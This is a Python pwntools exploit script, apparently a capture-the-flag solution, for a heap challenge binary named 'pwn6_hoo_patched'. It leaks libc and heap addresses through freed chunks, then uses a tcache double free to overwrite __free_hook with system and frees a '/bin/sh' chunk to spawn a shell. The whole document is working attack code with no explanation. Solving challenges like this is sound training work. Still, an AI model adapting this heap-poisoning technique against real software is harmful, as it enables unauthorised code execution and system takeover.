#!/usr/bin/env python3

from pwn import *

elf = context.binary = ELF("pwn6_hoo_patched")
libc = elf.libc

local = True 
if local:
    p = process("./pwn6_hoo_patched")
    #gdb.attach(p,'''''')
else:
    p = remote('', 1337)

elf = context.binary = ELF('./pwn6_hoo_patched', checksec=False)

def create(idx,data):
    p.sendafter(b">",b"1")
    p.sendafter(b"Index:",str(idx))
    p.sendafter(b"Input data:",data)
def show(idx):
    p.sendafter(b">",b"2")
    p.sendafter(b"Index:",str(idx))
def edit(index,data):
    p.sendafter(b">",b"3")
    p.sendafter(b"Input index:",str(index))
    p.send(data)
def free(idx):
    p.sendafter(b">",b"4")
    p.sendafter(b"Input index:",str(idx))


##########################
# STEP_1: LEAK_LIBC_BASE #
##########################

for i in range(9):
    create(i, b"\x00") 
for i in range(8):
    free(i)
show(7)
p.recvuntil(b"Data = ")
base = int.from_bytes(p.recv(6),"little") - 0x3B2CA0
print("\nLibc_base:   ", hex(base))

show(6)
p.recvuntil(b"Data = ")
heap = int.from_bytes(p.recv(6),"little") - 0x530
print("\nHeap_base:   ", hex(heap))

##########################
# STEP_2: CALCULATE_ADDR #
##########################

free_hook = base + 0x3B48E8
system = base + 0x41af0
print("\nFree_hook:   ", hex(free_hook))
print("System:      ", hex(system))

#####################
# STEP_3: GET_SHELL #
#####################
for i in range(7):
    create(i, b"\x00") 
create(0, b"\x00")
free(0)
free(0)
create(6,p64(free_hook))
create(1,b"/bin/sh\x00")
create(6,p64(system))
free(1)

p.interactive()